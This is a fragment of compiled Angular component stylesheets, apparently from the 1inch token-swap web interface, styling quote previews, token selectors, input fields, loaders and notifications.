.select-destination-token[_ngcontent-ipc-c360]:not([disabled=true]):focus{background:var(--1inch-bg-10)}.select-destination-token[disabled=true][_ngcontent-ipc-c360]{pointer-events:none}.quotes-list[_ngcontent-ipc-c360]{padding-top:12px;margin-top:-12px;height:172px;transition:height .3s;overflow:hidden}.quotes-list.expanded[_ngcontent-ipc-c360]{height:256px}button.quote-preview[_ngcontent-ipc-c360]{cursor:pointer;margin-bottom:8px;display:block;width:100%;text-align:left;outline:none!important;box-shadow:none!important}button.quote-preview[_ngcontent-ipc-c360]:last-child{margin-bottom:0}button.quote-preview.active[_ngcontent-ipc-c360]     .quote-container{border:1px solid var(--1inch-common-border-01);background-color:var(--1inch-hover-01)}button.quote-preview.active[_ngcontent-ipc-c360]     .quote-container .skeleton:after{background-image:linear-gradient(270deg,var(--1inch-skeleton-bg-01) 0,var(--1inch-skeleton-bg-02))}button.quote-preview[_ngcontent-ipc-c360]:focus     .quote-container, button.quote-preview[_ngcontent-ipc-c360]:hover     .quote-container{background-color:var(--1inch-hover-01)}button.quote-preview[_ngcontent-ipc-c360]:hover     .quote-container .market-expand>*, button.quote-preview[_ngcontent-ipc-c360]:hover     .quote-container .token-amount-container, button.quote-preview[_ngcontent-ipc-c360]:focus     .quote-container .market-expand>*, button.quote-preview[_ngcontent-ipc-c360]:focus     .quote-container .token-amount-container, button.quote-preview.active[_ngcontent-ipc-c360]     .quote-container .market-expand>*, button.quote-preview.active[_ngcontent-ipc-c360]     .quote-container .token-amount-container{color:var(--1inch-text-01)}button.quote-preview[_ngcontent-ipc-c360]     .tx-cost .token-amount{color:var(--1inch-common-text-02)}</style><style>.approving-loader[_ngcontent-ipc-c361]{width:16px;margin-left:6px}.text-with-icon[_ngcontent-ipc-c361]   .info-icon[_ngcontent-ipc-c361]{margin-left:8px}.info-icon-text[_ngcontent-ipc-c361]{font-size:13px;line-height:15px;max-width:250px;display:inline-block}.info-icon-text[_ngcontent-ipc-c361] > *[_ngcontent-ipc-c361]{margin-bottom:15px}.info-icon-text[_ngcontent-ipc-c361]   a[_ngcontent-ipc-c361]{color:var(--1inch-common-text-03)}.info-icon-text[_ngcontent-ipc-c361]   a[_ngcontent-ipc-c361]:hover{text-decoration:none;opacity:.75}.alert-button[_ngcontent-ipc-c361]{background:var(--1inch-common-bg-04);cursor:pointer}</style><style>[_nghost-ipc-c339]{display:flex;flex-direction:row;align-items:center;cursor:pointer}.readonly[_nghost-ipc-c339]{cursor:default}.tokens-pair-icons[_ngcontent-ipc-c339]   .token-icon[_ngcontent-ipc-c339]{width:24px;height:24px}.tokens-pair-icons[_ngcontent-ipc-c339]   .token-icon[_ngcontent-ipc-c339]:first-child{margin-right:4px}.tokens-pair-icons[_ngcontent-ipc-c339]   .token-icon[_ngcontent-ipc-c339]:last-of-type{margin-left:-12px}.token-icon[_ngcontent-ipc-c339]{width:24px;height:24px}.token-icon[_ngcontent-ipc-c339]:first-child{margin-right:4px}.token-symbol[_ngcontent-ipc-c339]{font-size:20px;white-space:nowrap;color:var(--1inch-text-01);margin:0 6px 0 8px}.token-select-icon[_ngcontent-ipc-c339]{color:var(--1inch-common-text-02)}.token-symbol-tooltip[_ngcontent-ipc-c339]{font-size:13px;max-width:250px;display:inline-block}</style><style>.layout-table[_ngcontent-ipc-c365]{width:100%;font-size:12px;line-height:15px;color:var(--1inch-common-text-02)}.layout-table-row[_ngcontent-ipc-c365]{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}.layout-table-row[_ngcontent-ipc-c365]:last-child{margin-bottom:0}.rate-info[_ngcontent-ipc-c365]{min-width:250px}.rate-info-icon[_ngcontent-ipc-c365]{cursor:pointer;margin:-2px 0 0 8px}.pathfinder-route[_ngcontent-ipc-c365]{height:16px;cursor:pointer}.pathfinder-route[_ngcontent-ipc-c365]:hover{color:var(--1inch-text-01)}.pathfinder-route[_ngcontent-ipc-c365]:hover   svg[_ngcontent-ipc-c365]{color:var(--1inch-text-01)}.pathfinder-route[_ngcontent-ipc-c365] > *[_ngcontent-ipc-c365]{vertical-align:middle}.flat-path[_ngcontent-ipc-c365]{display:inline-block}.flat-path[_ngcontent-ipc-c365] > span[_ngcontent-ipc-c365]{position:relative;margin-right:15px}.flat-path[_ngcontent-ipc-c365] > span[_ngcontent-ipc-c365]:before, .flat-path[_ngcontent-ipc-c365] > span[_ngcontent-ipc-c365]:after{content:" ";position:absolute;height:7px;width:2px;top:1px;right:-8px;border-radius:3px;background-color:currentColor}.flat-path[_ngcontent-ipc-c365] > span[_ngcontent-ipc-c365]:before{transform:rotate(-45deg)}.flat-path[_ngcontent-ipc-c365] > span[_ngcontent-ipc-c365]:after{top:5px;transform:rotate(45deg)}.flat-path[_ngcontent-ipc-c365] > span[_ngcontent-ipc-c365]:last-child{margin-right:0}.flat-path[_ngcontent-ipc-c365] > span[_ngcontent-ipc-c365]:last-child:before, .flat-path[_ngcontent-ipc-c365] > span[_ngcontent-ipc-c365]:last-child:after{content:"";width:0}.fullscreen-route-btn[_ngcontent-ipc-c365]{display:inline-block;margin-left:9px;margin-right:-1px}.expand-button[_ngcontent-ipc-c365]{color:var(--1inch-common-text-02)}.expand-button[_ngcontent-ipc-c365]   .arrow-expand[_ngcontent-ipc-c365]{margin:-2px 0 0 8px;color:var(--1inch-common-text-04)}.expand-button[_ngcontent-ipc-c365]:hover, .expand-button[_ngcontent-ipc-c365]:focus{color:var(--1inch-text-01)}.expand-button[_ngcontent-ipc-c365]:hover   .arrow-expand[_ngcontent-ipc-c365], .expand-button[_ngcontent-ipc-c365]:focus   .arrow-expand[_ngcontent-ipc-c365]{color:var(--1inch-text-01)}</style><style>[_nghost-ipc-c239]{display:inline;text-align:right;white-space:nowrap;color:currentColor}.unknown-price[_ngcontent-ipc-c239]{margin-left:6px;color:var(--1inch-warning-text-02);opacity:1!important}.field-warning-img[_ngcontent-ipc-c239]{margin-top:-2px;margin-left:4px}.small[_ngcontent-ipc-c239]{font-size:13px}.token-usd-price[_ngcontent-ipc-c239]{color:var(--1inch-common-text-02)}</style><style>[_nghost-ipc-c238]{display:inline-block;vertical-align:top;line-height:14px}[_nghost-ipc-c238]:hover{color:var(--1inch-text-01)}</style><style>[_nghost-ipc-c313]{display:block}.loading-indicator[_ngcontent-ipc-c313]{color:var(--1inch-text-06)}.loading-indicator[_ngcontent-ipc-c313]   .background-circle[_ngcontent-ipc-c313]{stroke:var(--1inch-border-08)}</style><style>[_nghost-ipc-c250]{display:block;margin:-2px 0}.gas-refund-value-wrap[_ngcontent-ipc-c250]{display:inline-flex;align-items:center;border-radius:4px;padding:2px 4px;margin-left:8px;background:var(--1inch-gradient-02)}.gas-refund-value-wrap[_ngcontent-ipc-c250]   span[_ngcontent-ipc-c250]{margin-bottom:-2px}.gas-refund-value-wrap[_ngcontent-ipc-c250]:hover{cursor:pointer}.gas-refund-value[_ngcontent-ipc-c250]{font-size:11px;line-height:13px;font-weight:500;color:var(--1inch-common-text-01);white-space:nowrap}</style><style>[_nghost-ipc-c354]{position:absolute;right:-19px;top:-2px}tui-badge[_ngcontent-ipc-c354]{width:16px;height:16px!important;font-size:10px;color:var(--1inch-common-text-01)!important;background-color:var(--1inch-common-btn-bg-06)!important}tui-badge.has-unsecured[_ngcontent-ipc-c354]{background-color:var(--1inch-warning-text-02)!important}tui-badge.has-unsecured.has-unprofitable[_ngcontent-ipc-c354]{background-color:var(--1inch-common-bg-04)!important}</style><style>[_nghost-ipc-c308]{display:block;width:100%;width:-webkit-fill-available}.amount-input[_ngcontent-ipc-c308]{min-height:24px!important;--tui-focus: transparent;width:100%}.amount-input[_ngcontent-ipc-c308]     .input{font-size:24px;min-height:24px;padding:0!important;text-align:right;background:none;border:none;outline:none;color:var(--1inch-text-03)}.amount-input[_ngcontent-ipc-c308]     .content{text-align:right;padding:0}.amount-input[_ngcontent-ipc-c308]     .placeholder{font-size:23px!important;color:var(--1inch-common-text-04)!important}.amount-input[_ngcontent-ipc-c308]     .placeholder_raised{transform:unset}</style><style>[_nghost-ipc-c227]{display:block;border-radius:var(--tui-radius-m);text-align:left}.textfield[_ngcontent-ipc-c227]{border-radius:inherit;text-align:inherit}</style><style>[_nghost-ipc-c221]{font:var(--tui-font-text-s);color:var(--tui-text-01);position:relative;display:block;border-radius:var(--tui-radius-m);text-align:left}[data-size='s'][_nghost-ipc-c221]{height:var(--tui-height-s);min-height:var(--tui-height-s);max-height:var(--tui-height-s)}[data-size='m'][_nghost-ipc-c221]{height:var(--tui-height-m);min-height:var(--tui-height-m);max-height:var(--tui-height-m)}[data-size='l'][_nghost-ipc-c221]{height:var(--tui-height-l);min-height:var(--tui-height-l);max-height:var(--tui-height-l);font-size:.9375rem}.input[_ngcontent-ipc-c221]{font:var(--tui-font-text-s);color:var(--tui-text-01);padding:0;border:0 solid transparent;border-radius:inherit;background:0 0;font-size:inherit;line-height:inherit;font-weight:inherit;color:inherit;caret-color:currentColor;outline:0;-webkit-appearance:none;-moz-appearance:none;appearance:none;word-break:keep-all;-webkit-text-fill-color:currentColor;position:absolute;top:0;left:0;width:100%;height:100%;padding:0 var(--tui-padding-m);border-width:0 var(--border-end) 0 var(--border-start);border-inline-start-width:var(--border-start);border-inline-end-width:var(--border-end);text-indent:var(--text-indent);text-align:inherit;box-sizing:border-box;white-space:nowrap;overflow:hidden;text-transform:inherit}.input[_ngcontent-ipc-c221]:-webkit-autofill, .input[_ngcontent-ipc-c221]:-webkit-autofill:focus, .input[_ngcontent-ipc-c221]:-webkit-autofill:hover{border-radius:inherit;color:inherit!important;background-color:transparent!important;-webkit-text-fill-color:var(--tui-text-01)!important;border-color:var(--tui-autofill);-webkit-box-shadow:0 0 0 1000px var(--tui-autofill) inset!important}.input   tui-primitive-textfield[data-mode=onDark][_nghost-ipc-c221]:-webkit-autofill, tui-primitive-textfield[data-mode=onDark]   [_nghost-ipc-c221]:-webkit-autofill, .input   tui-primitive-textfield[data-mode=onDark][_nghost-ipc-c221]:-webkit-autofill:focus, tui-primitive-textfield[data-mode=onDark]   [_nghost-ipc-c221]:-webkit-autofill:focus, .input   tui-primitive-textfield[data-mode=onDark][_nghost-ipc-c221]:-webkit-autofill:hover, tui-primitive-textfield[data-mode=onDark]   [_nghost-ipc-c221]:-webkit-autofill:hover, [data-mode=onDark][_nghost-ipc-c221]   .input[_ngcontent-ipc-c221]:-webkit-autofill, [data-mode=onDark][_nghost-ipc-c221]   .input[_ngcontent-ipc-c221]:-webkit-autofill:focus, [data-mode=onDark][_nghost-ipc-c221]   .input[_ngcontent-ipc-c221]:-webkit-autofill:hover{border-radius:inherit;color:inherit!important;background-color:transparent!important;-webkit-text-fill-color:var(--tui-text-01-night)!important;border-color:var(--tui-autofill-night);-webkit-box-shadow:0 0 0 1000px var(--tui-autofill-night) inset!important}.input   tui-primitive-textfield[data-size='s'][_nghost-ipc-c221]:not(tui-primitive-textfield), tui-primitive-textfield[data-size='s']   [_nghost-ipc-c221]:not(tui-primitive-textfield), [data-size='s'][_nghost-ipc-c221]   .input[_ngcontent-ipc-c221]{padding:0 var(--tui-padding-s)}.input   tui-primitive-textfield[data-size='l'][_nghost-ipc-c221]:not(tui-primitive-textfield), tui-primitive-textfield[data-size='l']   [_nghost-ipc-c221]:not(tui-primitive-textfield), [data-size='l'][_nghost-ipc-c221]   .input[_ngcontent-ipc-c221]{padding:0 var(--tui-padding-l)}.input   tui-primitive-textfield._disabled[_nghost-ipc-c221], tui-primitive-textfield._disabled   [_nghost-ipc-c221], ._disabled[_nghost-ipc-c221]   .input[_ngcontent-ipc-c221]{pointer-events:none}.input   tui-primitive-textfield[data-size='l']:not(._label-outside)[_nghost-ipc-c221]:not(tui-primitive-textfield), tui-primitive-textfield[data-size='l']:not(._label-outside)   [_nghost-ipc-c221]:not(tui-primitive-textfield), [data-size='l'][_nghost-ipc-c221]:not(._label-outside)   .input[_ngcontent-ipc-c221]{padding-top:1.25rem}.input   tui-primitive-textfield[data-size='l']:not(._label-outside)[_nghost-ipc-c221]:not(tui-primitive-textfield):-webkit-autofill + .content[_ngcontent-ipc-c221]   .placeholder[_ngcontent-ipc-c221], tui-primitive-textfield[data-size='l']:not(._label-outside)   [_nghost-ipc-c221]:not(tui-primitive-textfield):-webkit-autofill + .content[_ngcontent-ipc-c221]   .placeholder[_ngcontent-ipc-c221], [data-size='l'][_nghost-ipc-c221]:not(._label-outside)   .input[_ngcontent-ipc-c221]:-webkit-autofill + .content[_ngcontent-ipc-c221]   .placeholder[_ngcontent-ipc-c221]{font-size:.8156rem;transform:translateY(-.625rem)}.input   tui-primitive-textfield[data-size='m']:not(._label-outside)[_nghost-ipc-c221]:not(tui-primitive-textfield), tui-primitive-textfield[data-size='m']:not(._label-outside)   [_nghost-ipc-c221]:not(tui-primitive-textfield), [data-size='m'][_nghost-ipc-c221]:not(._label-outside)   .input[_ngcontent-ipc-c221]{padding-top:1.125rem}.input   tui-primitive-textfield[data-size='m']:not(._label-outside)[_nghost-ipc-c221]:not(tui-primitive-textfield):-webkit-autofill + .content[_ngcontent-ipc-c221]   .placeholder[_ngcontent-ipc-c221], tui-primitive-textfield[data-size='m']:not(._label-outside)   [_nghost-ipc-c221]:not(tui-primitive-textfield):-webkit-autofill + .content[_ngcontent-ipc-c221]   .placeholder[_ngcontent-ipc-c221], [data-size='m'][_nghost-ipc-c221]:not(._label-outside)   .input[_ngcontent-ipc-c221]:-webkit-autofill + .content[_ngcontent-ipc-c221]   .placeholder[_ngcontent-ipc-c221]{font-size:.69rem;transform:translateY(-.5rem)}.input   tui-primitive-textfield._hidden[_nghost-ipc-c221], tui-primitive-textfield._hidden   [_nghost-ipc-c221], ._hidden[_nghost-ipc-c221]   input.input[_ngcontent-ipc-c221]{opacity:0;text-indent:-10em;-webkit-user-select:none}.filler[_ngcontent-ipc-c221]{vertical-align:middle}.content[_ngcontent-ipc-c221]{display:flex;height:100%;width:100%;padding:0 var(--tui-padding-m);box-sizing:border-box;align-items:center;overflow:hidden}[data-size='s'][_nghost-ipc-c221]   .content[_ngcontent-ipc-c221]{padding:0 var(--tui-padding-s)}[data-size='l'][_nghost-ipc-c221]   .content[_ngcontent-ipc-c221]{padding:0 var(--tui-padding-l)}.content[_ngcontent-ipc-c221]:after{content:'';margin-right:-.25rem}[data-size='m'][_nghost-ipc-c221]   .content[_ngcontent-ipc-c221]:after{display:none}.wrapper[_ngcontent-ipc-c221]{flex:1;min-width:0;padding-right:.25rem;-webkit-padding-end:.25rem;padding-inline-end:.25rem;-webkit-padding-start:0;padding-inline-start:0}.placeholder[_ngcontent-ipc-c221]{transition-property:transform,font-size,color,letter-spacing;transition-duration:var(--tui-duration,300ms);transition-timing-function:ease-in-out;font:var(--tui-font-text-s);color:var(--tui-text-01);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block;width:100%;font-size:.8125rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;color:var(--tui-text-02);pointer-events:none}.placeholder_raised[_ngcontent-ipc-c221]{transform:translateY(-.625rem)}[data-size='m'][_nghost-ipc-c221]   .placeholder_raised[_ngcontent-ipc-c221]{font-size:.69rem;transform:translateY(-.5rem);letter-spacing:.025rem}._invalid[_nghost-ipc-c221]:not(._focused)   .placeholder_raised[_ngcontent-ipc-c221], ._invalid[_nghost-ipc-c221]:not(._focused)._hovered   .placeholder_raised[_ngcontent-ipc-c221]{color:var(--tui-error-fill)}[data-mode=onDark]._invalid[_nghost-ipc-c221]:not(._focused)   .placeholder_raised[_ngcontent-ipc-c221], [data-mode=onDark]._invalid[_nghost-ipc-c221]:not(._focused)._hovered   .placeholder_raised[_ngcontent-ipc-c221]{color:var(--tui-error-fill-night)}._focused[_nghost-ipc-c221]   .placeholder[_ngcontent-ipc-c221], [data-size='l']._focused._label-outside[_nghost-ipc-c221]   .placeholder[_ngcontent-ipc-c221], [data-size='m']._focused._label-outside[_nghost-ipc-c221]   .placeholder[_ngcontent-ipc-c221]{color:var(--tui-text-03)}[data-size='l'][_nghost-ipc-c221]   .placeholder[_ngcontent-ipc-c221]{font-size:.9375rem}[data-size='l'][_nghost-ipc-c221]   .placeholder_raised[_ngcontent-ipc-c221]{font-size:.8156rem}[data-size='l']._focused[_nghost-ipc-c221]:not(._label-outside)   .placeholder[_ngcontent-ipc-c221], [data-size='m']._focused[_nghost-ipc-c221]:not(._label-outside)   .placeholder[_ngcontent-ipc-c221]{color:var(--tui-text-01)}[data-mode=onDark][_nghost-ipc-c221]   .placeholder[_ngcontent-ipc-c221]{color:var(--tui-text-02-night)}[data-size='l'][data-mode=onDark]._focused[_nghost-ipc-c221]:not(._label-outside)   .placeholder[_ngcontent-ipc-c221], [data-size='m'][data-mode=onDark]._focused[_nghost-ipc-c221]:not(._label-outside)   .placeholder[_ngcontent-ipc-c221]{color:var(--tui-text-01-night)}[data-mode=onDark]._focused[_nghost-ipc-c221]   .placeholder[_ngcontent-ipc-c221], [data-size='l'][data-mode=onDark]._focused._label-outside[_nghost-ipc-c221]   .placeholder[_ngcontent-ipc-c221], [data-size='m'][data-mode=onDark]._focused._label-outside[_nghost-ipc-c221]   .placeholder[_ngcontent-ipc-c221]{color:var(--tui-text-02-night)}@supports (-webkit-hyphens:none){.placeholder[_ngcontent-ipc-c221]{transition-property:transform,color,letter-spacing}}.cleaner[_ngcontent-ipc-c221]{transition-duration:var(--tui-duration,300ms);transition-timing-function:ease-in-out;display:flex;width:1.5rem;height:1.5rem;align-items:center;justify-content:center;color:var(--tui-text-03);position:relative;box-sizing:border-box;cursor:pointer;transition-property:color,transform}.cleaner[_ngcontent-ipc-c221]:hover{color:var(--tui-text-02)}._disabled[_nghost-ipc-c221]   .cleaner[_ngcontent-ipc-c221], ._readonly[_nghost-ipc-c221]   .cleaner[_ngcontent-ipc-c221]{pointer-events:none}[data-mode=onDark][_nghost-ipc-c221]   .cleaner[_ngcontent-ipc-c221]{color:var(--tui-text-03-night)}[data-mode=onDark][_nghost-ipc-c221]   .cleaner[_ngcontent-ipc-c221]:hover{color:var(--tui-text-01-night)}.icon[_ngcontent-ipc-c221]{display:flex;align-items:center;justify-content:center;color:var(--tui-text-03)}.icon_left[_ngcontent-ipc-c221]{margin:0 .5rem 0 -.25rem;-webkit-margin-start:-.25rem;margin-inline-start:-.25rem;-webkit-margin-end:.5rem;margin-inline-end:.5rem}[data-size='s'][_nghost-ipc-c221]   .icon_left[_ngcontent-ipc-c221]{margin-right:.25rem;-webkit-margin-end:.25rem;margin-inline-end:.25rem}._autofilled[_nghost-ipc-c221]   .t-value-decoration[_ngcontent-ipc-c221]{display:none}.custom-content[_ngcontent-ipc-c221]{position:relative;display:flex;align-items:center;justify-content:center;width:2rem;height:2rem;margin-right:.25rem;pointer-events:none}.custom-icon[_ngcontent-ipc-c221]{width:100%;height:100%}.icon[_ngcontent-ipc-c221]{transition-duration:var(--tui-duration,300ms);transition-timing-function:ease-in-out;display:flex;width:1.5rem;height:1.5rem;align-items:center;justify-content:center;color:var(--tui-text-03);box-sizing:border-box;cursor:pointer;transition-property:color,transform;position:relative;pointer-events:none}.icon[_ngcontent-ipc-c221]:hover{color:var(--tui-text-02)}._disabled[_nghost-ipc-c221]   .icon[_ngcontent-ipc-c221], ._readonly[_nghost-ipc-c221]   .icon[_ngcontent-ipc-c221]{pointer-events:none}[data-mode=onDark][_nghost-ipc-c221]   .icon[_ngcontent-ipc-c221]{color:var(--tui-text-03-night)}[data-mode=onDark][_nghost-ipc-c221]   .icon[_ngcontent-ipc-c221]:hover{color:var(--tui-text-01-night)}._hovered[_nghost-ipc-c221]:not(._readonly)   .icon[_ngcontent-ipc-c221]{color:var(--tui-text-02)}[data-mode=onDark]._hovered[_nghost-ipc-c221]:not(._readonly)   .icon[_ngcontent-ipc-c221]{color:var(--tui-text-01-night)}[data-mode=onLight]._hovered[_nghost-ipc-c221]:not(._readonly)   .icon[_ngcontent-ipc-c221]{color:var(--tui-text-01)}.input[_ngcontent-ipc-c221]:not(:first-child){display:none}[data-size][_nghost-ipc-c221]   .input_template[_ngcontent-ipc-c221]{display:flex;width:100%;max-width:100%;align-items:center;pointer-events:none}.input[_ngcontent-ipc-c221]::-webkit-caps-lock-indicator{margin-right:.375rem;align-self:center}[data-size='l'][_nghost-ipc-c221]:not(._label-outside)   .input[_ngcontent-ipc-c221]::-webkit-caps-lock-indicator{margin-top:-1.25rem}.input[_ngcontent-ipc-c221]::-webkit-contacts-auto-fill-button, .input[_ngcontent-ipc-c221]::-webkit-credentials-auto-fill-button, .input[_ngcontent-ipc-c221]::-webkit-credit-card-auto-fill-button{background-color:var(--tui-text-03)}[data-size='l'][_nghost-ipc-c221]:not(._label-outside)   .input[_ngcontent-ipc-c221]::-webkit-contacts-auto-fill-button, [data-size='l'][_nghost-ipc-c221]:not(._label-outside)   .input[_ngcontent-ipc-c221]::-webkit-credentials-auto-fill-button, [data-size='l'][_nghost-ipc-c221]:not(._label-outside)   .input[_ngcontent-ipc-c221]::-webkit-credit-card-auto-fill-button{margin-top:-1.25rem}.input[_ngcontent-ipc-c221]::-webkit-contacts-auto-fill-button:hover, .input[_ngcontent-ipc-c221]::-webkit-credentials-auto-fill-button:hover, .input[_ngcontent-ipc-c221]::-webkit-credit-card-auto-fill-button:hover{background-color:var(--tui-text-02)}.input[_ngcontent-ipc-c221]:-webkit-autofill, .input[_ngcontent-ipc-c221]:-webkit-autofill::first-line{font-size:inherit;line-height:inherit}.text-template[_ngcontent-ipc-c221]{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}</style><style>[_nghost-ipc-c140]{transition-property:color,background;transition-duration:var(--tui-duration,300ms);transition-timing-function:ease-in-out;position:relative;display:block;height:100%;width:100%;border-radius:inherit}[_nghost-ipc-c140]:after{transition-property:box-shadow;transition-duration:var(--tui-duration,300ms);transition-timing-function:ease-in-out;content:'';position:absolute;top:0;left:0;right:0;bottom:0;border-radius:inherit;border:1px solid currentColor;pointer-events:none;color:transparent}._focused[_nghost-ipc-c140]:after{border-width:2px;color:var(--tui-focus)}[data-state=disabled][_nghost-ipc-c140]{pointer-events:none}</style><style tuiautofilleddirective="">
+@keyframes tuiAutofillOn {
+    from {
+        content: '1';
+    }
+
+    to {
+        content: '2';
+    }
+}
+
+@keyframes tuiAutofillOff {
+    from {
+        content: '2';
+    }
+
+    to {
+        content: '1';
+    }
+}</style><style>[_nghost-ipc-c224]{position:absolute;display:block;height:1.25rem;max-width:calc(100% - 2rem);margin:-1.25rem 0;padding:.625rem 0;box-sizing:content-box;color:var(--tui-text-01);white-space:nowrap;overflow:hidden;pointer-events:none}._table[_nghost-ipc-c224]{position:static}tui-textfield[data-mode=onDark]   [_nghost-ipc-c224]{color:var(--tui-text-01-night)}.t-ghost[_ngcontent-ipc-c224]{visibility:hidden;white-space:pre;text-overflow:clip}.t-filler[_ngcontent-ipc-c224]{color:var(--tui-text-03)}tui-textfield[data-mode=onDark][_nghost-ipc-c224]   .t-filler[_ngcontent-ipc-c224], tui-textfield[data-mode=onDark]   [_nghost-ipc-c224]   .t-filler[_ngcontent-ipc-c224]{color:var(--tui-text-03-night)}</style><style>[_nghost-ipc-c311]{display:inline-block;position:relative}[_nghost-ipc-c311]   img[_ngcontent-ipc-c311]{width:100%;position:absolute;z-index:2;display:none;opacity:1}[_nghost-ipc-c311]   .image_stub[_ngcontent-ipc-c311]:nth-child(2){display:none!important}.image[_ngcontent-ipc-c311], .image_stub[_ngcontent-ipc-c311]{border-radius:50%;background:var(--1inch-btn-bg-05)}.image_stub[_ngcontent-ipc-c311]{position:absolute;top:0;bottom:0;left:0;width:100%;display:flex;justify-content:center;align-items:center;color:var(--1inch-text-07)}</style><style>.quote-container[_ngcontent-ipc-c359]{display:block;position:relative;height:76px;padding:15px 16px 16px;font-size:13px;border-radius:8px 12px 12px;transition:border .2s,background-color .2s;color:var(--1inch-common-text-02);border:1px solid var(--1inch-border-04)}.quote-data-wrap[_ngcontent-ipc-c359]{height:100%}.quote-data[_ngcontent-ipc-c359]{display:flex;flex-direction:column;justify-content:space-between;height:100%}.quote-data-row[_ngcontent-ipc-c359]{display:flex;justify-content:space-between;align-items:center}.market-name-container.selectable[_ngcontent-ipc-c359] > span[_ngcontent-ipc-c359]:hover   .market-name[_ngcontent-ipc-c359]{text-decoration:underline}.market-name-container.selectable[_ngcontent-ipc-c359]   .market-expand[_ngcontent-ipc-c359]:hover, .market-name-container.selectable[_ngcontent-ipc-c359]   .market-expand[_ngcontent-ipc-c359]:focus{background-color:var(--1inch-bg-10);border-radius:12px}.market-name-container[_ngcontent-ipc-c359]:not(.selectable)   .arrow-down[_ngcontent-ipc-c359]{display:none}.market-expand[_ngcontent-ipc-c359]{padding:0 4px 0 8px;border-radius:4px;margin:0 -4px 0 -8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.market-expand[_ngcontent-ipc-c359] > *[_ngcontent-ipc-c359]{color:var(--1inch-common-text-02)}.market-name[_ngcontent-ipc-c359]{font-weight:500;font-size:16px;line-height:26px}.token-amount[_ngcontent-ipc-c359]{font-size:20px;line-height:23px}.token-amount-container[_ngcontent-ipc-c359]{min-height:20px;white-space:nowrap}.token-amount-container[_ngcontent-ipc-c359], .token-amount-usd-price[_ngcontent-ipc-c359]{text-align:right}.quote-preview-tx-cost[_ngcontent-ipc-c359]{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-right:8px;color:var(--1inch-common-text-02)}.save-amount[_ngcontent-ipc-c359]{display:block;font-size:11px;background:#00897B;color:#fff;padding:4px 10px;border-radius:10px 10px 10px 0;position:absolute;left:-1px;top:-10px;z-index:1}.arrow-down[_ngcontent-ipc-c359]{display:inline-block;position:relative;width:12px;height:8px;margin-left:8px}.arrow-down[_ngcontent-ipc-c359]:before, .arrow-down[_ngcontent-ipc-c359]:after{content:" ";position:absolute;height:7px;width:2px;top:0;border-radius:3px;background-color:currentColor}.arrow-down[_ngcontent-ipc-c359]:before{transform:rotate(-135deg);left:4px}.arrow-down[_ngcontent-ipc-c359]:after{transform:rotate(135deg);left:0}.quote-token-amount-usd-price[_ngcontent-ipc-c359]{text-align:right}.market-name-info[_ngcontent-ipc-c359]{margin-left:4px;margin-top:-2px}.direct-swap-tooltip-text[_ngcontent-ipc-c359]{max-width:270px;font-size:13px;line-height:15px;color:var(--1inch-text-03)}</style><style>.skeleton[_ngcontent-ipc-c358]{margin:-16px;padding:22px 16px 17px;overflow:hidden;display:flex;flex-direction:column;justify-content:space-between;height:76px;border-radius:12px;position:relative}.skeleton-row[_ngcontent-ipc-c358]{display:flex;justify-content:space-between;align-items:center}.skeleton-box[_ngcontent-ipc-c358]{border-radius:4px;width:35%;height:12px;background:var(--1inch-skeleton-bg-03)}.skeleton-box-small[_ngcontent-ipc-c358]{width:25%}.skeleton[_ngcontent-ipc-c358]:after{position:absolute;top:0;right:0;bottom:0;left:0;transform:translate(-100%);background-image:linear-gradient(270deg,var(--1inch-skeleton-bg-04) 0,var(--1inch-skeleton-bg-05));animation:shimmer 1.5s infinite;content:""}@keyframes shimmer{to{transform:translate(100%)}}.skeleton[_ngcontent-ipc-c358]:hover:after{background-image:linear-gradient(270deg,var(--1inch-skeleton-bg-01) 0,var(--1inch-skeleton-bg-02))}.skeleton-box-text[_ngcontent-ipc-c358]{display:none}.save-amount[_ngcontent-ipc-c358]{display:block;font-size:11px;background:#00897B;color:#fff;padding:4px 10px;border-radius:10px 10px 10px 0;position:absolute;left:-1px;top:-10px;z-index:1}.is-one-inch[_ngcontent-ipc-c358]{padding:15px 16px 19px}.is-one-inch[_ngcontent-ipc-c358]   .skeleton-row[_ngcontent-ipc-c358]:first-of-type   .skeleton-box-text[_ngcontent-ipc-c358]{display:flex;font-size:16px;font-weight:500;line-height:26px;color:var(--1inch-text-01)}.is-one-inch[_ngcontent-ipc-c358]   .skeleton-row[_ngcontent-ipc-c358]:first-of-type   .skeleton-box-small[_ngcontent-ipc-c358]{display:none}.is-one-inch[_ngcontent-ipc-c358]   .skeleton-row[_ngcontent-ipc-c358]:first-of-type   .skeleton-box[_ngcontent-ipc-c358]{margin-left:auto}</style><style>[_nghost-ipc-c338]{display:inline;color:var(--1inch-common-text-02);white-space:nowrap}.token-swap-field-loading[_ngcontent-ipc-c338]{margin-right:4px;width:16px;height:16px;margin-top:-3px}.high-price-impact[_ngcontent-ipc-c338]{color:var(--1inch-warning-text-01)}</style><style>[_nghost-ipc-c337]{display:inline}.high-slippage[_ngcontent-ipc-c337]{color:var(--1inch-warning-text-01)}.attention-icon[_ngcontent-ipc-c337]{margin-left:4px;margin-top:-2px}.field-warning-img[_ngcontent-ipc-c337]{margin-top:-2px;margin-left:4px;color:var(--1inch-warning-text-01)}.small-size[_ngcontent-ipc-c337]{font-size:13px}.small-size[_ngcontent-ipc-c337]   .attention-icon[_ngcontent-ipc-c337]{transform:scale(.75);margin-left:0}</style><style>.mat-snack-bar-container{border-radius:4px;box-sizing:border-box;display:block;margin:24px;max-width:33vw;min-width:344px;padding:14px 16px;min-height:48px;transform-origin:center}.cdk-high-contrast-active .mat-snack-bar-container{border:solid 1px}.mat-snack-bar-handset{width:100%}.mat-snack-bar-handset .mat-snack-bar-container{margin:8px;max-width:100%;min-width:0;width:100%}
